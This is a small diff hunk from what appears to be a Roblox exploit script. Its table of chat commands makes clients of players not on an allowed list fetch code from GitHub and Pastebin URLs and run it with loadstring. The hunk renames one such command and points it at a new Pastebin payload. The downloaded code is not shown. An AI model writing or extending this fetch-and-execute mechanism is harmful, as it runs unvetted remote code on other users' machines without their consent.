@@ -10695,9 +10695,9 @@ local commands = {
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
 		end
 	end,
-	[";byfron default"] = function()
+	[";chipman default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			loadstring(game:HttpGet("https://pastebin.com/raw/bNCCX1qN"))()
+			loadstring(game:HttpGet("https://pastebin.com/raw/EiTjShAQ"))()
 		end
 	end,
 	[";freeze default"] = function()
